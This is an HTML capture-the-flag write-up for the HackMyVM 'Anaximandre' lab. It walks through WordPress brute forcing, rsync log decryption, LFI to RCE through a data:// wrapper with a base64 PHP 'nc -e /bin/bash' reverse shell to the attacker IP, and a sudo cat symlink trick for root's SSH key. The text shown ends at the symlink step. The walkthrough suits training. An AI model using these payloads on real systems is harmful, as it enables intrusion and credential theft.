@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Anaximandre :: 0xWriteups</title>
+<meta name="description" content="HackMyVM Anaximandre writeup — WordPress weak creds, LFI to RCE via log poisoning, rsync backup pivot, sudo cat privesc to root.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;0,800;1,400&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="static/css/anaximandre.css">
+</head>
+<body>
+<div class="crt-overlay"></div>
+<div class="vignette"></div>
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <a href="index.html" class="logo"><span class="bracket">[</span><span class="core">0xWriteups</span><span class="bracket">]</span></a>
+    <nav class="links">
+      <a href="index.html#writeups">writeups</a>
+      <div class="term-clock" id="term-clock" aria-live="off">
+        <div class="tc-line">┬─[Sh4d0wSpl01t@3xpl0174bl3:~]─[<span id="clock-time">00:00:00 AM</span>]</div>
+        <div class="tc-line">╰─&gt;$ <span class="tc-typed" id="tc-typed"></span><span class="tc-caret"></span></div>
+      </div>
+    </nav>
+  </div>
+</header>
+
+<div class="reader-hero">
+  <div class="reader-hero-inner">
+    <a href="index.html#writeups" class="reader-back">&larr; back to writeups</a>
+    <figure class="rc-media reader-cover" id="media-cover">
+      <div class="rc-media-frame">
+        <img src="static/assets/covers/anaximandre.jpg" alt="Anaximandre cover" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Cover image not found</strong><small>expected at: static/assets/covers/anaximandre.jpg</small></div>
+      </div>
+    </figure>
+    <div class="reader-eyebrow">
+      <span class="platform-tag"><span class="platform-dot hmv"></span>HackMyVM</span>
+      <span class="difficulty medium">medium</span>
+    </div>
+    <h1 class="reader-title">Anaximandre</h1>
+    <div class="reader-meta">
+      <span>Target: 192.168.56.146</span>
+      <a href="https://hackmyvm.eu/" target="_blank" rel="noopener">HackMyVM &rarr;</a>
+    </div>
+    <div class="reader-tags">
+      <span class="tag">#wordpress</span>
+      <span class="tag">#lfi</span>
+      <span class="tag">#rsync</span>
+      <span class="tag">#log-poisoning</span>
+      <span class="tag">#sudo</span>
+    </div>
+  </div>
+</div>
+
+<div class="reader-layout">
+  <aside class="reader-sidebar">
+    <details class="toc" id="toc-details" open>
+      <summary class="toc-summary">Contents</summary>
+      <div class="toc-eyebrow">on this page</div>
+      <nav class="toc-list" id="toc-list">
+        <a href="#introduction" data-target="introduction"><span class="toc-icon">&#128075;</span>Introduction</a>
+        <a href="#network-scanning" data-target="network-scanning"><span class="toc-icon">&#128269;</span>Network Scanning &amp; Enumeration</a>
+        <a href="#initial-discovery" data-target="initial-discovery" class="sub">Initial Discovery</a>
+        <a href="#port-scanning" data-target="port-scanning" class="sub">Port Scanning</a>
+        <a href="#web-enum" data-target="web-enum"><span class="toc-icon">&#128193;</span>Web Enumeration</a>
+        <a href="#web-server-analysis" data-target="web-server-analysis" class="sub">Analyzing the Web Server</a>
+        <a href="#host-file-config" data-target="host-file-config" class="sub">Host File Configuration</a>
+        <a href="#directory-fuzzing" data-target="directory-fuzzing" class="sub">Directory Fuzzing</a>
+        <a href="#wp-user-enum" data-target="wp-user-enum" class="sub">WordPress User Enumeration</a>
+        <a href="#foothold" data-target="foothold"><span class="toc-icon">&#128273;</span>Gaining Initial Access</a>
+        <a href="#bruteforce-attack" data-target="bruteforce-attack" class="sub">Brute Force Attack</a>
+        <a href="#wp-admin-access" data-target="wp-admin-access" class="sub">WordPress Admin Access</a>
+        <a href="#rsync-decrypt" data-target="rsync-decrypt"><span class="toc-icon">&#128230;</span>Rsync &amp; Decrypting Logs</a>
+        <a href="#rsync-enum" data-target="rsync-enum" class="sub">Rsync Enumeration</a>
+        <a href="#downloading-files" data-target="downloading-files" class="sub">Downloading Files</a>
+        <a href="#decrypting-logs" data-target="decrypting-logs" class="sub">Decrypting the Logs</a>
+        <a href="#exploit-webapp" data-target="exploit-webapp"><span class="toc-icon">&#128137;</span>Exploiting the Web App</a>
+        <a href="#analyzing-logs" data-target="analyzing-logs" class="sub">Analyzing Logs</a>
+        <a href="#log-poisoning-rce" data-target="log-poisoning-rce" class="sub">Log Poisoning &amp; RCE</a>
+        <a href="#catching-shell" data-target="catching-shell" class="sub">Catching the Shell</a>
+        <a href="#lateral-movement" data-target="lateral-movement"><span class="toc-icon">&#128100;</span>Lateral Movement</a>
+        <a href="#discovering-creds" data-target="discovering-creds" class="sub">Discovering Credentials</a>
+        <a href="#switching-user" data-target="switching-user" class="sub">Switching User</a>
+        <a href="#privesc" data-target="privesc"><span class="toc-icon">&#128081;</span>Privilege Escalation</a>
+        <a href="#sudo-enum" data-target="sudo-enum" class="sub">Sudo Enumeration</a>
+        <a href="#exploit-sudo-ssh" data-target="exploit-sudo-ssh" class="sub">Reading SSH Keys via Sudo</a>
+        <a href="#root-access" data-target="root-access" class="sub">Root Access</a>
+        <a href="#flags" data-target="flags"><span class="toc-icon">&#127937;</span>Flags</a>
+      </nav>
+    </details>
+  </aside>
+
+  <article class="reader-article" id="reader-article">
+
+    <h2 class="rc-h2" id="introduction"><span class="h2-icon">&#128075;</span>Introduction</h2>
+
+    <p class="rc-p"><strong>Anaximandre</strong> is a Linux-based target on HackMyVM that involves a multi-step exploitation process. The journey begins with network discovery, moves through a WordPress CMS vulnerability (weak credentials), leverages a local file inclusion (LFI) vulnerability in a web application, pivots through exposed backup files, and finally escalates privileges via a misconfigured sudo rule and rsync.</p>
+
+    <ul class="rc-list">
+      <li>Difficulty: Medium</li>
+      <li>Platform: HackMyVM</li>
+      <li>Target IP: <code>192.168.56.146</code></li>
+      <li>Attacker IP: <code>192.168.56.1</code></li>
+    </ul>
+
+    <h2 class="rc-h2" id="network-scanning"><span class="h2-icon">&#128269;</span>Network Scanning &amp; Enumeration</h2>
+
+    <h3 class="rc-h3" id="initial-discovery">Initial Discovery</h3>
+
+    <p class="rc-p">We start by identifying the target on the local network using an nmap ping sweep.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-ping-sweep">copy</button></div>
+      <pre><code id="code-ping-sweep">nmap -sn 192.168.56.1/24</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-01">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-01.png" alt="nmap ping sweep revealing the target IP" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-01.png</small></div>
+      </div>
+      <figcaption class="rc-caption">nmap ping sweep scan</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="port-scanning">Port Scanning</h3>
+
+    <p class="rc-p">We perform a detailed scan using rustscan to quickly identify open ports, followed by nmap for service detection.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-rustscan">copy</button></div>
+      <pre><code id="code-rustscan">rustscan --ulimit 5000 -a 192.168.56.146 -- -sS -sC -A -T4 -open -oN nmap.txt -oX nmap.xml</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-02">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-02.png" alt="rustscan output showing open ports" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-02.png</small></div>
+      </div>
+      <figcaption class="rc-caption">rustscan port scan</figcaption>
+      <p>Results:</p>
+    </figure>
+
+    <figure class="rc-media" id="media-03">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-03.png" alt="nmap service detection output" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-03.png</small></div>
+      </div>
+      <figcaption class="rc-caption">rustscan port scan results</figcaption>
+    </figure>
+
+    <ul class="rc-list">
+      <li><strong>22/tcp</strong> (SSH): OpenSSH 8.4p1 Debian</li>
+      <li><strong>80/tcp</strong> (HTTP): Apache httpd 2.4.54 (Debian)</li>
+      <li><strong>873/tcp</strong> (rsync): Protocol version 31</li>
+    </ul>
+
+    <h2 class="rc-h2" id="web-enum"><span class="h2-icon">&#128193;</span>Web Enumeration</h2>
+
+    <h3 class="rc-h3" id="web-server-analysis">Analyzing the Web Server</h3>
+
+    <p class="rc-p">Navigating to <code>http://192.168.56.146</code> shows a WordPress site titled &ldquo;Mindblown: a blog about philosophy.&rdquo;</p>
+
+    <figure class="rc-media" id="media-04">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-04.png" alt="WordPress landing page" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-04.png</small></div>
+      </div>
+      <figcaption class="rc-caption">Wordpress site</figcaption>
+    </figure>
+
+    <p class="rc-p">Checking the page source reveals the WordPress version is 6.1.1.</p>
+
+    <figure class="rc-media" id="media-05">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-05.png" alt="page source showing the WordPress version" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-05.png</small></div>
+      </div>
+      <figcaption class="rc-caption">Wordpress source code</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="host-file-config">Host File Configuration</h3>
+
+    <p class="rc-p">The source code references the domain <code>anaximandre.hmv</code>. We add this to our <code>/etc/hosts</code> file for easier access.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>text</span><button class="rc-copy" data-target="code-hosts">copy</button></div>
+      <pre><code id="code-hosts">192.168.56.146    anaximandre.hmv</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-06">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-06.png" alt="adding the domain to /etc/hosts" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-06.png</small></div>
+      </div>
+      <figcaption class="rc-caption">/etc/hosts entry</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="directory-fuzzing">Directory Fuzzing</h3>
+
+    <p class="rc-p">Using dirsearch, we discover standard WordPress directories and files, including wp-login.php and xmlrpc.php.</p>
+
+    <figure class="rc-media" id="media-07">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-07.png" alt="dirsearch results, part 1" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-07.png</small></div>
+      </div>
+      <figcaption class="rc-caption">dirsearch scan</figcaption>
+    </figure>
+    <p>Result:</p>
+
+    <figure class="rc-media" id="media-08">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-08.png" alt="dirsearch results, part 2" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-08.png</small></div>
+      </div>
+      <figcaption class="rc-caption">dirsearch result</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="wp-user-enum">WordPress User Enumeration</h3>
+
+    <p class="rc-p">We use wpscan to enumerate users.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-wpscan-users">copy</button></div>
+      <pre><code id="code-wpscan-users">wpscan --url http://anaximandre.hmv/ -e u</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-09">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-09.png" alt="wpscan user enumeration, part 1" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-09.png</small></div>
+      </div>
+      <figcaption class="rc-caption">wpscan</figcaption>
+    </figure>
+
+    <figure class="rc-media" id="media-10">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-10.png" alt="wpscan user enumeration, part 2" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-10.png</small></div>
+      </div>
+      <figcaption class="rc-caption">valid usernames: admin and webmaster</figcaption>
+    </figure>
+
+    <h2 class="rc-h2" id="foothold"><span class="h2-icon">&#128273;</span>Gaining Initial Access (Foothold)</h2>
+
+    <h3 class="rc-h3" id="bruteforce-attack">Brute Force Attack</h3>
+
+    <p class="rc-p">We attempt a password attack against the xmlrpc.php endpoint using the rockyou.txt wordlist.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-wpscan-brute">copy</button></div>
+      <pre><code id="code-wpscan-brute">wpscan --url http://anaximandre.hmv/ -U admin,webmaster -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-11">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-11.png" alt="wpscan brute force in progress" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-11.png</small></div>
+      </div>
+      <figcaption class="rc-caption">wpscan</figcaption>
+    </figure>
+
+    <figure class="rc-media" id="media-12">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-12.png" alt="successful credential find" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-12.png</small></div>
+      </div>
+      <figcaption class="rc-caption">webmaster : mickey</figcaption>
+    </figure>
+
+    <ul class="rc-list">
+      <li>Username: <code>webmaster</code></li>
+      <li>Password: <code>mickey</code></li>
+    </ul>
+
+    <h3 class="rc-h3" id="wp-admin-access">WordPress Admin Access</h3>
+
+    <p class="rc-p">We log in to the WordPress dashboard at <code>http://anaximandre.hmv/wp-login.php</code>.</p>
+
+    <figure class="rc-media" id="media-13">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-13.png" alt="logging into the WordPress dashboard" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-13.png</small></div>
+      </div>
+      <figcaption class="rc-caption">wp-login page</figcaption>
+    </figure>
+
+    <p class="rc-p">Once inside, we check the comments section and find a pending comment containing a sensitive note:</p>
+
+    <figure class="rc-media" id="media-14">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-14.png" alt="WordPress comments section, part 1" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-14.png</small></div>
+      </div>
+      <figcaption class="rc-caption">webmaster's wordpress dashboard</figcaption>
+    </figure>
+    <p>On carefully inspecting the dashboard I noticed a key that was recently commented:</p>
+
+    <figure class="rc-media" id="media-15">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-15.png" alt="the pending comment with the note" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-15.png</small></div>
+      </div>
+      <figcaption class="rc-caption">decryption key</figcaption>
+    </figure>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>text</span><button class="rc-copy" data-target="code-note">copy</button></div>
+      <pre><code id="code-note">"CONFIDENTIAL NOT TO BE PUBLISHED note to self: Yn89m1RFBJ"</code></pre>
+    </div>
+
+    <p class="rc-p">This string <code>Yn89m1RFBJ</code> appears to be a decryption key.</p>
+
+    <h2 class="rc-h2" id="rsync-decrypt"><span class="h2-icon">&#128230;</span>Leveraging Rsync &amp; Decrypting Logs</h2>
+
+    <h3 class="rc-h3" id="rsync-enum">Rsync Enumeration</h3>
+
+    <p class="rc-p">Port 873 (rsync) is open. We enumerate the available shares.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-rsync-list">copy</button></div>
+      <pre><code id="code-rsync-list">rsync rsync://192.168.56.146</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-16">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-16.png" alt="rsync share listing" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-16.png</small></div>
+      </div>
+      <figcaption class="rc-caption">rsync enumeration</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="downloading-files">Downloading Files</h3>
+
+    <p class="rc-p">We download the contents of the share to our local machine.</p>
+
+    <figure class="rc-media" id="media-17">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-17.png" alt="downloaded .cpt files, part 1" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-17.png</small></div>
+      </div>
+      <figcaption class="rc-caption">listing the available shares in share_rsync</figcaption>
+    </figure>
+    <p>Downloading the shares to out local machine:</p>
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-rsync-dl">copy</button></div>
+      <pre><code id="code-rsync-dl">rsync "rsync://192.168.56.146/share_rsync/*.cpt" .</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-18">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-18.png" alt="downloaded .cpt files, part 2" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-18.png</small></div>
+      </div>
+      <figcaption class="rc-caption">encrypted backup files</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="decrypting-logs">Decrypting the Logs</h3>
+
+    <p class="rc-p">Using the key found earlier (Yn89m1RFBJ), we decrypt the files using ccrypt.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-ccrypt">copy</button></div>
+      <pre><code id="code-ccrypt">ccrypt -d access.log.cpt
+# Enter decryption key: Yn89m1RFBJ
+# (Repeat for other .cpt files)</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-19">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-19.png" alt="decrypting the log files, part 1" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-19.png</small></div>
+      </div>
+      <figcaption class="rc-caption">placing decryption key in a file</figcaption>
+    </figure>
+    <p>Decrypting the log files:</p>
+
+    <figure class="rc-media" id="media-20">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-20.png" alt="decrypted access.log, auth.log, error.log" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-20.png</small></div>
+      </div>
+      <figcaption class="rc-caption">successful decryption</figcaption>
+    </figure>
+    <p>We've successfully decrypted the log files.</p>
+
+    <h2 class="rc-h2" id="exploit-webapp"><span class="h2-icon">&#128137;</span>Exploiting the Web Application</h2>
+
+    <h3 class="rc-h3" id="analyzing-logs">Analyzing Logs for Vulnerabilities</h3>
+
+    <p class="rc-p">Reading the decrypted error.log reveals a vulnerable web application:</p>
+
+    <figure class="rc-media" id="media-21">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-21.png" alt="error.log revealing the vulnerable path" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-21.png</small></div>
+      </div>
+      <figcaption class="rc-caption">concatenation of the error log entry</figcaption>
+    </figure>
+
+    <ul class="rc-list">
+      <li>Path: <code>/var/www/i3geo/pacotes/qrcode/qr_img.php</code></li>
+      <li>Referer header: lovegeografia.anaximandre.hmv</li>
+    </ul>
+
+    <p class="rc-p">Adding the referer header found into the /etc/hosts:</p>
+
+    <figure class="rc-media" id="media-22">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-22.png" alt="browser inspection leading to the LFI" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-22.png</small></div>
+      </div>
+      <figcaption class="rc-caption">/etc/hosts entry</figcaption>
+    </figure>
+  <p>Navigating to the page; lovegeografia.anaximandre.hmv:</p>
+
+    <figure class="rc-media" id="media-23">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-23.png" alt="LFI confirmed, contents of /etc/passwd" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-23.png</small></div>
+      </div>
+      <figcaption class="rc-caption">webpage at lovegeografia.anaximandre.hmv</figcaption>
+    </figure>
+    <p>On visiting the page I found just another page with a different layout.</p>
+    <p>Viewing the access log we can see the LFI in action:</p>
+
+    
+    <div class="rc-code">
+      <div class="rc-code-head"><span>text</span><button class="rc-copy" data-target="code-lfi">copy</button></div>
+      <pre><code id="code-lfi">http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=../../../../etc/passwd</code></pre>
+    </div>
+
+  <figure class="rc-media" id="media-23">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-24.png" alt="LFI confirmed, contents of /etc/passwd" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-23.png</small></div>
+      </div>
+      <figcaption class="rc-caption">viewing the access log entry</figcaption>
+    </figure>
+    <p>Result:</p>
+
+    <figure class="rc-media" id="media-23">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-25.png" alt="LFI confirmed, contents of /etc/passwd" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-23.png</small></div>
+      </div>
+      <figcaption class="rc-caption">confirmed LFI</figcaption>
+    </figure>
+
+    <p>The highlighted entry in the access log shows the LFI in action, allowing us to read the contents of /etc/passwd.</p>
+    <p>Going back to the webpage, we can see that we can read the contents of /etc/passwd.</p>
+
+    <figure class="rc-media" id="media-23">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-26.png" alt="LFI confirmed, contents of /etc/passwd" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-23.png</small></div>
+      </div>
+      <figcaption class="rc-caption">/etc/passwd contents</figcaption>
+    </figure>
+
+    <p>From the screenshot, we can see the contents of /etc/passwd. Which also validates there exists a user, 'chaz' in the system.</p>
+    <p>Also on view the auth logs we see that it supports our finding that indeed the user chaz does exist</p>
+    
+    <figure class="rc-media" id="media-23">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-27.png" alt="LFI confirmed, contents of /etc/passwd" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-23.png</small></div>
+      </div>
+      <figcaption class="rc-caption">concatenating the auth log entry</figcaption>
+    </figure>
+    <p>Result:</p>
+
+    <figure class="rc-media" id="media-23">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-28.png" alt="LFI confirmed, contents of /etc/passwd" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-23.png</small></div>
+      </div>
+      <figcaption class="rc-caption">auth log entry showing user chaz</figcaption>
+    </figure>
+    <p>Additionally, we observe successful login attempts by the root user via SSH, indicating a potential security breach.</p> 
+    
+
+
+    <h3 class="rc-h3" id="log-poisoning-rce">Log Poisoning &amp; RCE</h3>
+
+    <p class="rc-p">We use the LFI to poison the Apache access logs with a PHP reverse shell.</p>
+
+    <ol class="rc-list">
+      <li>We craft a PHP payload: <code>&lt;?php system('nc -e /bin/bash 192.168.56.1 1234'); ?&gt;</code></li>
+      <li>We base64 encode it</li>
+      <li>We inject it into the URL via the User-Agent header (or directly via the LFI if wrappers are enabled)</li>
+    </ol>
+
+    <figure class="rc-media" id="media-24">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-29.png" alt="base64 encoding the PHP payload" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-24.png</small></div>
+      </div>
+      <figcaption class="rc-caption">php payload base64 encoded</figcaption>
+    </figure>
+
+    <p class="rc-p">The crafted URL uses the data:// wrapper (or similar technique) to execute the payload directly:</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>text</span><button class="rc-copy" data-target="code-data-wrapper">copy</button></div>
+      <pre><code id="code-data-wrapper">http://lovegeografia.anaximandre.hmv/exemplos/codemirror.php?&pagina=data://text/plain;base64,PD9waHAgc3lzdGVtKCduYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC41Ni4xIDEyMzQnKTsgPz4=</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-25">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-30.png" alt="triggering the payload via the data wrapper" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-25.png</small></div>
+      </div>
+      <figcaption class="rc-caption">url with php encoded payload</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="catching-shell">Catching the Shell</h3>
+
+    <p class="rc-p">We set up a netcat listener and trigger the URL.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-nc-listen">copy</button></div>
+      <pre><code id="code-nc-listen">penelope -i 192.168.56.1 -p 1234</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-26">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-31.png" alt="shell caught as www-data" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-26.png</small></div>
+      </div>
+      <figcaption class="rc-caption">connection as www-data, upgraded with penelope</figcaption>
+    </figure>
+
+    <p>The shell is captured on visiting the URL with the PHP payload.</p>
+
+    <h2 class="rc-h2" id="lateral-movement"><span class="h2-icon">&#128100;</span>Lateral Movement (User Pivoting)</h2>
+
+    <h3 class="rc-h3" id="discovering-creds">Discovering Credentials</h3>
+
+    <p class="rc-p">Inside the shell as www-data, we look for configuration files. We check /etc/rsyncd.auth (or similar) and find credentials:</p>
+
+    <figure class="rc-media" id="media-27">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-32.png" alt="credentials found in a config file" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-27.png</small></div>
+      </div>
+      <figcaption class="rc-caption">chaz : alanamorrenchazado</figcaption>
+    </figure>
+
+    <ul class="rc-list">
+      <li>User: <code>chaz</code></li>
+      <li>Password: <code>alanamorrenchazado</code></li>
+    </ul>
+
+    <h3 class="rc-h3" id="switching-user">Switching User</h3>
+
+    <p class="rc-p">We use these credentials to switch to the user chaz.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-su-chaz">copy</button></div>
+      <pre><code id="code-su-chaz">su chaz
+# Password: alanamorrenchazado</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-28">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-33.png" alt="now logged in as chaz" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-28.png</small></div>
+      </div>
+      <figcaption class="rc-caption">confirms user chaz</figcaption>
+    </figure>
+
+    <h2 class="rc-h2" id="privesc"><span class="h2-icon">&#128081;</span>Privilege Escalation</h2>
+
+    <h3 class="rc-h3" id="sudo-enum">Sudo Enumeration</h3>
+
+    <p class="rc-p">We check sudo permissions for chaz.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-sudo-l">copy</button></div>
+      <pre><code id="code-sudo-l">sudo -l</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-29">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-34.png" alt="sudo -l output showing the NOPASSWD rule" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-29.png</small></div>
+      </div>
+      <figcaption class="rc-caption">(ALL : ALL) NOPASSWD: /usr/bin/cat /home/chaz/*</figcaption>
+    </figure>
+
+    <p class="rc-p">This allows chaz to read any file in their home directory as root.</p>
+
+    <h3 class="rc-h3" id="exploit-sudo-ssh">Exploiting Sudo to Read SSH Keys</h3>
+
+    <p class="rc-p">We suspect the root user's SSH private key is accessible if we can link to it. We create a symbolic link in our home directory pointing to root's SSH key:</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-symlink">copy</button></div>
+      <pre><code id="code-symlink">ln -s /root/.ssh/id_rsa .</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-30">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-35.png" alt="creating the symlink to root's SSH key" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-30.png</small></div>
+      </div>
+      <figcaption class="rc-caption">soft link created to root's private ssh key</figcaption>
+    </figure>
+
